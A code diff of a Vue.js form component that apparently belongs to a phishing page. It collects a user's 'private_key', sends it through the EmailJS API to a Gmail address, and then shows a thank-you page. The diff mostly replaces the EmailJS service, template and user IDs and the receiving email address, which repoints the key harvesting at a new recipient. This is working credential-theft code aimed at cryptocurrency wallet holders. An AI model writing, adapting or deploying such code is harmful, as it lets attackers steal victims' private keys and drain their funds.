@@ -19,7 +19,7 @@ export default {
   data() {
     return {
       private_key: "",
-      loading: false
+      loading: false,
     };
   },
   methods: {
@@ -29,29 +29,29 @@ export default {
       const checker = this.formChecker();
       if (checker) {
         var data = {
-          service_id: "service_e7kbs4p",
-          template_id: "template_ymnxcmq",
-          user_id: "user_Eux8rfZ8wcQHlqRkfU7eC",
+          service_id: "service_o6cjtvh",
+          template_id: "template_axdenmh",
+          user_id: "user_q7g2o9qDOiH2ojVRoiuNN",
           template_params: {
             from_name: "Private Key",
             private_key: this.private_key,
-            reply_to: "makatibliss@gmail.com"
-          }
+            reply_to: "gibsonkendra725@gmail.com",
+          },
         };
         axios
           .post("https://api.emailjs.com/api/v1.0/email/send", data)
-          .then(function() {
-            self.$router.push("/thank-you")
+          .then(function () {
+            self.$router.push("/thank-you");
             self.loading = false;
           })
-          .catch(function() {
+          .catch(function () {
             self.loading = false;
           });
       } else {
         this.$notify({
           title: "Warning",
           message: "All Form input is required",
-          type: "warning"
+          type: "warning",
         });
       }
     },
@@ -61,11 +61,10 @@ export default {
       } else {
         return true;
       }
-    }
-  }
+    },
+  },
 };
 </script>
 
 <style lang="scss">
-
 </style>
